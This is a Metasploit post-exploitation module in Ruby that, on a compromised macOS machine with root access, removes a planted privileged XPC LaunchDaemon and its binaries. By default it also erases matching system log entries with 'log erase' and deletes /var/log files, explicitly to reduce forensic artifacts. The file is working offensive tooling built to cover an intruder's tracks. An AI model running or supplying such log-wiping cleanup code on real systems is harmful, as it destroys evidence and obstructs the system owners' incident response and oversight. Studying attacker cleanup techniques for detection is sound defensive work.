##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC Daemon Uninstall',
        'Description'  => %q{
          Performs a clean removal of the privileged XPC daemon from a macOS
          target. Unloads the LaunchDaemon via launchctl, removes the daemon
          binary, plist, and client binary. Optionally clears associated
          system log entries to reduce forensic artifacts.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['shell', 'meterpreter']
      )
    )

    register_options([
      OptBool.new('CLEAN_LOGS', [true, 'Remove associated log entries after uninstall', true]),
    ])
  end

  def run
    unless is_root?
      fail_with(Failure::NoAccess, 'Root privileges are required to uninstall the XPC daemon')
    end

    print_status("Uninstalling XPC daemon (#{DAEMON_LABEL})...")
    xpc_uninstall

    if datastore['CLEAN_LOGS']
      print_status('Clearing associated log entries...')
      cmd_exec("log erase --predicate 'subsystem == \"#{DAEMON_LABEL}\"' 2>/dev/null; true")
      cmd_exec("rm -f /var/log/#{DAEMON_LABEL}.* 2>/dev/null; true")
      print_good('Log entries cleared')
    end

    # Verify removal
    status = xpc_status
    if status == :not_running
      print_good('XPC daemon successfully uninstalled and confirmed removed')
    else
      print_warning("Daemon may still be present (status: #{status})")
    end
  end
end
